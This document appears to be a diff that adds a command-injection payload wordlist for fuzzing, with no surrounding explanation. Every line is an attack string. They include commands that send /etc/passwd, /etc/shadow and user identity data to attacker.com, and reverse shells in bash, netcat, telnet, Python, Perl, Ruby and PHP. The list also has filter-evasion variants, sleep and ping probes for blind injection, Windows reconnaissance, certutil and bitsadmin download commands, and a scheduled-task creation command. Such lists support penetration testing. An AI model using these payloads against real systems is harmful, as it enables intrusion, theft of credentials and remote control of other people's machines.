+| wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+|| curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+|| wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+& curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+& wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+&& curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+&& wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+; curl http://attacker.com:8080/$(uname -a)
+; wget http://attacker.com:8080/$(uname -a)
+| curl http://attacker.com:8080/$(uname -a)
+| wget http://attacker.com:8080/$(uname -a)
+|| curl http://attacker.com:8080/$(uname -a)
+|| wget http://attacker.com:8080/$(uname -a)
+& curl http://attacker.com:8080/$(uname -a)
+& wget http://attacker.com:8080/$(uname -a)
+&& curl http://attacker.com:8080/$(uname -a)
+&& wget http://attacker.com:8080/$(uname -a)
+; nc attacker.com 4444 -e /bin/sh
+; nc attacker.com 4444 -c /bin/sh
+; ncat attacker.com 4444 -e /bin/sh
+| nc attacker.com 4444 -e /bin/sh
+| nc attacker.com 4444 -c /bin/sh
+| ncat attacker.com 4444 -e /bin/sh
+|| nc attacker.com 4444 -e /bin/sh
+|| nc attacker.com 4444 -c /bin/sh
+|| ncat attacker.com 4444 -e /bin/sh
+& nc attacker.com 4444 -e /bin/sh
+& nc attacker.com 4444 -c /bin/sh
+& ncat attacker.com 4444 -e /bin/sh
+&& nc attacker.com 4444 -e /bin/sh
+&& nc attacker.com 4444 -c /bin/sh
+&& ncat attacker.com 4444 -e /bin/sh
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; sh -i >& /dev/tcp/attacker.com/4444 0>&1
+| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+| sh -i >& /dev/tcp/attacker.com/4444 0>&1
+|| bash -i >& /dev/tcp/attacker.com/4444 0>&1
+|| sh -i >& /dev/tcp/attacker.com/4444 0>&1
+& bash -i >& /dev/tcp/attacker.com/4444 0>&1
+& sh -i >& /dev/tcp/attacker.com/4444 0>&1
+&& bash -i >& /dev/tcp/attacker.com/4444 0>&1
+&& sh -i >& /dev/tcp/attacker.com/4444 0>&1
+; telnet attacker.com 4444 | /bin/sh
+; telnet attacker.com 4444 | /bin/bash
+| telnet attacker.com 4444 | /bin/sh
+| telnet attacker.com 4444 | /bin/bash
+|| telnet attacker.com 4444 | /bin/sh
+|| telnet attacker.com 4444 | /bin/bash
+& telnet attacker.com 4444 | /bin/sh
+& telnet attacker.com 4444 | /bin/bash
+&& telnet attacker.com 4444 | /bin/sh
+&& telnet attacker.com 4444 | /bin/bash
+; curl -d "data=$(whoami)" http://attacker.com/receive
+; wget --post-data="data=$(whoami)" http://attacker.com/receive
+| curl -d "data=$(whoami)" http://attacker.com/receive
+| wget --post-data="data=$(whoami)" http://attacker.com/receive
+|| curl -d "data=$(whoami)" http://attacker.com/receive
+|| wget --post-data="data=$(whoami)" http://attacker.com/receive
+& curl -d "data=$(whoami)" http://attacker.com/receive
+& wget --post-data="data=$(whoami)" http://attacker.com/receive
+&& curl -d "data=$(whoami)" http://attacker.com/receive
+&& wget --post-data="data=$(whoami)" http://attacker.com/receive
+; curl -X POST -d @/etc/passwd http://attacker.com/receive
+; curl -X POST -d @/etc/shadow http://attacker.com/receive
+| curl -X POST -d @/etc/passwd http://attacker.com/receive
+| curl -X POST -d @/etc/shadow http://attacker.com/receive
+|| curl -X POST -d @/etc/passwd http://attacker.com/receive
+|| curl -X POST -d @/etc/shadow http://attacker.com/receive
+& curl -X POST -d @/etc/passwd http://attacker.com/receive
+& curl -X POST -d @/etc/shadow http://attacker.com/receive
+&& curl -X POST -d @/etc/passwd http://attacker.com/receive
+&& curl -X POST -d @/etc/shadow http://attacker.com/receive
+; nslookup `whoami`.attacker.com
+; nslookup `hostname`.attacker.com
+| nslookup `whoami`.attacker.com
+| nslookup `hostname`.attacker.com
+|| nslookup `whoami`.attacker.com
+|| nslookup `hostname`.attacker.com
+& nslookup `whoami`.attacker.com
+& nslookup `hostname`.attacker.com
+&& nslookup `whoami`.attacker.com
+&& nslookup `hostname`.attacker.com
+; curl http://attacker.com/$(pwd | tr '/' '-')
+; wget http://attacker.com/$(pwd | tr '/' '-')
+| curl http://attacker.com/$(pwd | tr '/' '-')
+| wget http://attacker.com/$(pwd | tr '/' '-')
+|| curl http://attacker.com/$(pwd | tr '/' '-')
+|| wget http://attacker.com/$(pwd | tr '/' '-')
+& curl http://attacker.com/$(pwd | tr '/' '-')
+& wget http://attacker.com/$(pwd | tr '/' '-')
+&& curl http://attacker.com/$(pwd | tr '/' '-')
+&& wget http://attacker.com/$(pwd | tr '/' '-')
+; curl -A "User-Agent: $(whoami)" http://attacker.com
+; wget --user-agent="$(whoami)" http://attacker.com
+| curl -A "User-Agent: $(whoami)" http://attacker.com
+| wget --user-agent="$(whoami)" http://attacker.com
+|| curl -A "User-Agent: $(whoami)" http://attacker.com
+|| wget --user-agent="$(whoami)" http://attacker.com
+& curl -A "User-Agent: $(whoami)" http://attacker.com
+& wget --user-agent="$(whoami)" http://attacker.com
+&& curl -A "User-Agent: $(whoami)" http://attacker.com
+&& wget --user-agent="$(whoami)" http://attacker.com
+; curl http://attacker.com -H "X-Data: $(id)"
+; wget http://attacker.com --header="X-Data: $(id)"
+| curl http://attacker.com -H "X-Data: $(id)"
+| wget http://attacker.com --header="X-Data: $(id)"
+|| curl http://attacker.com -H "X-Data: $(id)"
+|| wget http://attacker.com --header="X-Data: $(id)"
+& curl http://attacker.com -H "X-Data: $(id)"
+& wget http://attacker.com --header="X-Data: $(id)"
+&& curl http://attacker.com -H "X-Data: $(id)"
+&& wget http://attacker.com --header="X-Data: $(id)"
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
+| perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
+; ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+| ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+| php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+; whoami; echo 'test'
+| whoami | echo 'test'
+|| whoami || echo 'test'
+& whoami & echo 'test'
+&& whoami && echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+test; whoami; test
+test | whoami | test
+test || whoami || test
+test & whoami & test
+test && whoami && test
+test `whoami` test
+test $(whoami) test
+'; whoami; '
+"; whoami; "
+'| whoami |'
+"| whoami |"
+'|| whoami ||'
+"|| whoami ||"
+'& whoami &'
+"& whoami &"
+'&& whoami &&'
+"&& whoami &&"
+'`whoami`'
+"`whoami`"
+'$(whoami)'
+"$(whoami)"
+') ; whoami ; ('
+") ; whoami ; ("
+') | whoami | ('
+") | whoami | ("
+') || whoami || ('
+") || whoami || ("
+') && whoami && ('
+") && whoami && ("
+'; whoami; echo '
+"; whoami; echo "
+'|| whoami || echo '
+"|| whoami || echo "
+1; whoami
+1| whoami
+1|| whoami
+1& whoami
+1&& whoami
+1`whoami`
+1$(whoami)
+a; whoami
+a| whoami
+a|| whoami
+a& whoami
+a&& whoami
+a`whoami`
+a$(whoami)
+-1; whoami
+-1| whoami
+-1|| whoami
+-1& whoami
+-1&& whoami
+-1`whoami`
+-1$(whoami)
+'; whoami; #
+"; whoami; #
+'| whoami | #
+"| whoami | #
+'|| whoami || #
+"|| whoami || #
+'& whoami & #
+"& whoami & #
+'&& whoami && #
+"&& whoami && #
+'`whoami`#
+"`whoami`#
+'$(whoami)#
+"$(whoami)#
+%0a; whoami
+%0a| whoami
+%0a|| whoami
+%0a& whoami
+%0a&& whoami
+%0a`whoami`
+%0a$(whoami)
+%0d; whoami
+%0d| whoami
+%0d|| whoami
+%0d& whoami
+%0d&& whoami
+%0d`whoami`
+%0d$(whoami)
+%0a%0d; whoami
+%0a%0d| whoami
+%0a%0d|| whoami
+%0a%0d& whoami
+%0a%0d&& whoami
+%0a%0d`whoami`
+%0a%0d$(whoami)
+'; whoami; --
+"; whoami; --
+'| whoami | --
+"| whoami | --
+'; whoami; /*
+"; whoami; /*
+'| whoami | /*
+"| whoami | /*
+*/; whoami; /*
+*/| whoami | /*
+*/|| whoami || /*
+*/& whoami & /*
+*/&& whoami && /*
+'; whoami; //
+"; whoami; //
+'| whoami | //
+"| whoami | //
+x'; whoami; '
+x"; whoami; "
+x'| whoami |'
+x"| whoami |"
+x'|| whoami ||'
+x"|| whoami ||"
+'; whoami || '
+"; whoami || "
+'; whoami && '
+"; whoami && "
+`whoami` || echo 'test'
+$(whoami) || echo 'test'
+`whoami` && echo 'test'
+$(whoami) && echo 'test'
+$(whoami)$(echo)
+`whoami``echo`
+'; $(whoami); '
+"; $(whoami); "
+'; `whoami`; '
+"; `whoami`; "
+'$(whoami)'
+"`whoami`"
+test'); whoami; ('test
+test"); whoami; ("test
+test'| whoami |'test
+test"| whoami |"test
+)); whoami; ((
+")); whoami; (("
+')); whoami; (('
+]; whoami; [
+"]; whoami; ["
+']; whoami; ['
+}; whoami; {
+"}; whoami; {"
+'}; whoami; {'
+>; whoami
+<; whoami
+>>; whoami
+<<; whoami
+<>; whoami
+>| whoami
+<| whoami
+>>| whoami
+<<| whoami
+<>| whoami
+test'; whoami; echo 'test
+test"; whoami; echo "test
+'; whoami; exit; '
+"; whoami; exit; "
+'|| whoami || exit ||'
+"|| whoami || exit ||"
+${IFS}whoami
+$IFS$9whoami
+{whoami}
+[whoami]
+(whoami)
+((whoami))
+$'whoami'
+$"whoami"
+'; whoami${IFS}; '
+"; whoami${IFS}; "
+'; who$()ami; '
+"; who$()ami; "
+'; who${x}ami; '
+"; who${x}ami; "
+'; who'am'i; '
+"; who"am"i; "
+'\nwhoami\n'
+"\nwhoami\n"
+'\rwhoami\r'
+"\rwhoami\r"
+'; \nwhoami\n; '
+"; \nwhoami\n; "
+%00; whoami
+%00| whoami
+%00|| whoami
+%00& whoami
+%00&& whoami
+'; whoami%00
+"; whoami%00
+'| whoami%00
+"| whoami%00
+```; whoami; ```
+"""; whoami; """
+'''; whoami; '''
+===; whoami; ===
+---; whoami; ---
+___; whoami; ___
+***; whoami; ***
++++; whoami; +++
+~~~; whoami; ~~~
+@@@; whoami; @@@
+$$$; whoami; $$$
+%%%; whoami; %%%
+^^^; whoami; ^^^
+&&&; whoami; &&&
+|||; whoami; |||
+test' OR '1'='1'; whoami; --
+test" OR "1"="1"; whoami; --
+test' AND '1'='1'; whoami; --
+test" AND "1"="1"; whoami; --
+<script>; whoami; </script>
+<img>; whoami; </img>
+<?php ; whoami; ?>
+<% ; whoami; %>
+{{ ; whoami; }}
+{% ; whoami; %}
+${ ; whoami; }
+#{ ; whoami; }
+@{ ; whoami; }
+
+; ls
+;ls
+; ls;
+;ls;
+|ls
+| ls
+| ls |
+|ls|
+||ls
+|| ls
+|| ls ||
+||ls||
+&ls
+& ls
+& ls &
+&ls&
+&&ls
+&& ls
+&& ls &&
+&&ls&&
+`ls`
+` ls `
+$(ls)
+$( ls )
+${ls}
+${ ls }
+;id;
+|id|
+||id||
+&id&
+&&id&&
+`id`
+$(id)
+${id}
+%0als
+%0aid
+%0apwd
+%0awhoami
+%0dls
+%0did
+%0dpwd
+%0dwhoami
+%0a%0dls
+%0a%0did
+%0a%0dpwd
+%0a%0dwhoami
+\nls
+\rid
+\r\npwd
+\n\rwhoami
+; ls%00
+| id%00
+|| pwd%00
+& whoami%00
+%00;ls
+%00|id
+%00||pwd
+%00&whoami
+; ls%20
+| id%20
+;ls%09
+|id%09
+;%09ls
+|%09id
+; ls%0b
+| id%0b
+; ls%0c
+| id%0c
+;;ls
+|||id
+&&&whoami
+;;;ls;;;
+||||id||||
+&&&&&whoami&&&&&
+;`ls`
+|`id`
+||`pwd`
+&`whoami`
+&&`uname`
+;$(ls)
+|$(id)
+||$(pwd)
+&$(whoami)
+&&$(uname)
+;cat${IFS}/etc/passwd
+|cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+|cat$IFS/etc/passwd
+;cat$IFS$9/etc/passwd
+|cat$IFS$9/etc/passwd
+;{ls,-la}
+|{cat,/etc/passwd}
+;cat</etc/passwd
+|cat</etc/passwd
+;cat<>/etc/passwd
+|cat<>/etc/passwd
+;cat<<EOF
+|cat<<EOF
+;cat<<<$(ls)
+|cat<<<$(id)
+;ls>/tmp/out
+|id>/tmp/out
+;ls>>/tmp/out
+|id>>/tmp/out
+;ls 2>&1
+|id 2>&1
+;ls 2>/dev/null
+|id 2>/dev/null
+;ls &>/dev/null
+|id &>/dev/null
+;(ls)
+|(id)
+;((ls))
+|((id))
+;{ls}
+|{id}
+;[ls]
+|[id]
+;$((1+1));ls
+|$((2+2));id
+;!ls
+|!id
+;~ls
+|~id
+;ls#comment
+|id#comment
+;ls//comment
+|id//comment
+;ls||id
+|ls&&id
+;ls|id
+|ls;id
+;ls&id
+|ls||id
+;ls&&whoami
+|ls||whoami||pwd
+;ls;id;pwd
+|ls|id|pwd
+;ls&id&pwd
+|ls||id||pwd
+;ls&&id&&pwd
+|ls;id;pwd;whoami
+;cat /etc/passwd;
+|cat /etc/passwd|
+;cat /etc/passwd||
+|cat /etc/passwd&&
+;cat /etc/passwd&
+|cat /etc/passwd;
+$'\n'ls
+$'\r'id
+$'\t'pwd
+$'\x0a'ls
+$'\x0d'id
+;l$()s
+|i$()d
+;l${}s
+|i${}d
+;l''s
+|i''d
+;l""s
+|i""d
+;l\s
+|i\d
+;l\
+s
+|i\
+d
+;ls$@
+|id$@
+;ls$*
+|id$*
+;ls$1
+|id$2
+;ls${x}
+|id${y}
+;ls$x
+|id$y
+;ls`echo`
+|id`echo`
+;ls$(echo)
+|id$(echo)
+;ls;exit
+|id;exit
+;ls||exit
+|id&&exit
+;ls&exit
+|id|exit
+
+; sleep 5
+; sleep 10
+; sleep 15
+; sleep 20
+; sleep 30
+| sleep 5
+| sleep 10
+| sleep 15
+| sleep 20
+| sleep 30
+|| sleep 5
+|| sleep 10
+|| sleep 15
+|| sleep 20
+|| sleep 30
+& sleep 5
+& sleep 10
+& sleep 15
+& sleep 20
+& sleep 30
+&& sleep 5
+&& sleep 10
+&& sleep 15
+&& sleep 20
+&& sleep 30
+` sleep 5 `
+` sleep 10 `
+` sleep 15 `
+` sleep 20 `
+` sleep 30 `
+$( sleep 5 )
+$( sleep 10 )
+$( sleep 15 )
+$( sleep 20 )
+$( sleep 30 )
+; ping -c 5 127.0.0.1
+; ping -c 10 127.0.0.1
+; ping -c 15 127.0.0.1
+; ping -c 20 127.0.0.1
+; ping -c 30 127.0.0.1
+| ping -c 5 127.0.0.1
+| ping -c 10 127.0.0.1
+| ping -c 15 127.0.0.1
+| ping -c 20 127.0.0.1
+| ping -c 30 127.0.0.1
+|| ping -c 5 127.0.0.1
+|| ping -c 10 127.0.0.1
+|| ping -c 15 127.0.0.1
+|| ping -c 20 127.0.0.1
+|| ping -c 30 127.0.0.1
+& ping -c 5 127.0.0.1
+& ping -c 10 127.0.0.1
+& ping -c 15 127.0.0.1
+& ping -c 20 127.0.0.1
+& ping -c 30 127.0.0.1
+&& ping -c 5 127.0.0.1
+&& ping -c 10 127.0.0.1
+&& ping -c 15 127.0.0.1
+&& ping -c 20 127.0.0.1
+&& ping -c 30 127.0.0.1
+` ping -c 5 127.0.0.1 `
+` ping -c 10 127.0.0.1 `
+` ping -c 15 127.0.0.1 `
+` ping -c 20 127.0.0.1 `
+` ping -c 30 127.0.0.1 `
+$( ping -c 5 127.0.0.1 )
+$( ping -c 10 127.0.0.1 )
+$( ping -c 15 127.0.0.1 )
+$( ping -c 20 127.0.0.1 )
+$( ping -c 30 127.0.0.1 )
+; ping -n 5 127.0.0.1
+; ping -n 10 127.0.0.1
+; ping -n 15 127.0.0.1
+; ping -n 20 127.0.0.1
+; ping -n 30 127.0.0.1
+| ping -n 5 127.0.0.1
+| ping -n 10 127.0.0.1
+| ping -n 15 127.0.0.1
+| ping -n 20 127.0.0.1
+| ping -n 30 127.0.0.1
+|| ping -n 5 127.0.0.1
+|| ping -n 10 127.0.0.1
+|| ping -n 15 127.0.0.1
+|| ping -n 20 127.0.0.1
+|| ping -n 30 127.0.0.1
+& ping -n 5 127.0.0.1
+& ping -n 10 127.0.0.1
+& ping -n 15 127.0.0.1
+& ping -n 20 127.0.0.1
+& ping -n 30 127.0.0.1
+&& ping -n 5 127.0.0.1
+&& ping -n 10 127.0.0.1
+&& ping -n 15 127.0.0.1
+&& ping -n 20 127.0.0.1
+&& ping -n 30 127.0.0.1
+` ping -n 5 127.0.0.1 `
+` ping -n 10 127.0.0.1 `
+` ping -n 15 127.0.0.1 `
+` ping -n 20 127.0.0.1 `
+` ping -n 30 127.0.0.1 `
+$( ping -n 5 127.0.0.1 )
+$( ping -n 10 127.0.0.1 )
+$( ping -n 15 127.0.0.1 )
+$( ping -n 20 127.0.0.1 )
+$( ping -n 30 127.0.0.1 )
+; timeout 5
+; timeout 10
+; timeout 15
+; timeout 20
+; timeout 30
+| timeout 5
+| timeout 10
+| timeout 15
+| timeout 20
+| timeout 30
+|| timeout 5
+|| timeout 10
+|| timeout 15
+|| timeout 20
+|| timeout 30
+& timeout 5
+& timeout 10
+& timeout 15
+& timeout 20
+& timeout 30
+&& timeout 5
+&& timeout 10
+&& timeout 15
+&& timeout 20
+&& timeout 30
+
+; dir
+; whoami
+; hostname
+; ipconfig
+; ipconfig /all
+; systeminfo
+; net user
+; net localgroup administrators
+; tasklist
+; type C:\Windows\win.ini
+; ver
+; set
+; echo %username%
+; echo %computername%
+| dir
+| whoami
+| hostname
+| ipconfig
+| ipconfig /all
+| systeminfo
+| net user
+| net localgroup administrators
+| tasklist
+| type C:\Windows\win.ini
+| ver
+| set
+| echo %username%
+| echo %computername%
+|| dir
+|| whoami
+|| hostname
+|| ipconfig
+|| ipconfig /all
+|| systeminfo
+|| net user
+|| net localgroup administrators
+|| tasklist
+|| type C:\Windows\win.ini
+|| ver
+|| set
+|| echo %username%
+|| echo %computername%
+& dir
+& whoami
+& hostname
+& ipconfig
+& ipconfig /all
+& systeminfo
+& net user
+& net localgroup administrators
+& tasklist
+& type C:\Windows\win.ini
+& ver
+& set
+& echo %username%
+& echo %computername%
+&& dir
+&& whoami
+&& hostname
+&& ipconfig
+&& ipconfig /all
+&& systeminfo
+&& net user
+&& net localgroup administrators
+&& tasklist
+&& type C:\Windows\win.ini
+&& ver
+&& set
+&& echo %username%
+&& echo %computername%
+; ping -n 5 127.0.0.1
+; ping -n 10 127.0.0.1
+| ping -n 5 127.0.0.1
+| ping -n 10 127.0.0.1
+|| ping -n 5 127.0.0.1
+|| ping -n 10 127.0.0.1
+& ping -n 5 127.0.0.1
+& ping -n 10 127.0.0.1
+&& ping -n 5 127.0.0.1
+&& ping -n 10 127.0.0.1
+; timeout /t 5
+; timeout /t 10
+| timeout /t 5
+| timeout /t 10
+|| timeout /t 5
+|| timeout /t 10
+& timeout /t 5
+& timeout /t 10
+&& timeout /t 5
+&& timeout /t 10
+; cmd /c dir
+; cmd /c whoami
+; cmd /c hostname
+; cmd /c ipconfig
+| cmd /c dir
+| cmd /c whoami
+| cmd /c hostname
+| cmd /c ipconfig
+|| cmd /c dir
+|| cmd /c whoami
+|| cmd /c hostname
+|| cmd /c ipconfig
+& cmd /c dir
+& cmd /c whoami
+& cmd /c hostname
+& cmd /c ipconfig
+&& cmd /c dir
+&& cmd /c whoami
+&& cmd /c hostname
+&& cmd /c ipconfig
+; powershell -Command "Get-Process"
+; powershell -Command "Get-ComputerInfo"
+; powershell -Command "Get-LocalUser"
+; powershell -Command "whoami"
+| powershell -Command "Get-Process"
+| powershell -Command "Get-ComputerInfo"
+| powershell -Command "Get-LocalUser"
+| powershell -Command "whoami"
+|| powershell -Command "Get-Process"
+|| powershell -Command "Get-ComputerInfo"
+|| powershell -Command "Get-LocalUser"
+|| powershell -Command "whoami"
+& powershell -Command "Get-Process"
+& powershell -Command "Get-ComputerInfo"
+& powershell -Command "Get-LocalUser"
+& powershell -Command "whoami"
+&& powershell -Command "Get-Process"
+&& powershell -Command "Get-ComputerInfo"
+&& powershell -Command "Get-LocalUser"
+&& powershell -Command "whoami"
+; powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
+; powershell.exe -Enc dwBoAG8AYQBtAGkA
+| powershell.exe -EncodedCommand dwBoAG8AYQBtAGkA
+| powershell.exe -Enc dwBoAG8AYQBtAGkA
+; wmic os get caption
+; wmic process list brief
+; wmic useraccount list brief
+| wmic os get caption
+| wmic process list brief
+| wmic useraccount list brief
+|| wmic os get caption
+|| wmic process list brief
+|| wmic useraccount list brief
+& wmic os get caption
+& wmic process list brief
+& wmic useraccount list brief
+&& wmic os get caption
+&& wmic process list brief
+&& wmic useraccount list brief
+; certutil -urlcache -split -f http://example.com/file.txt
+| certutil -urlcache -split -f http://example.com/file.txt
+|| certutil -urlcache -split -f http://example.com/file.txt
+& certutil -urlcache -split -f http://example.com/file.txt
+&& certutil -urlcache -split -f http://example.com/file.txt
+; bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+| bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+|| bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+& bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+&& bitsadmin /transfer job http://example.com/file.txt C:\temp\file.txt
+; reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+; reg query HKCU\Software
+| reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+| reg query HKCU\Software
+|| reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+|| reg query HKCU\Software
+& reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+& reg query HKCU\Software
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion
+&& reg query HKCU\Software
+; schtasks /query
+; schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+| schtasks /query
+| schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+|| schtasks /query
+|| schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+& schtasks /query
+& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
+&& schtasks /query
+&& schtasks /create /tn test /tr cmd.exe /sc once /st 00:00
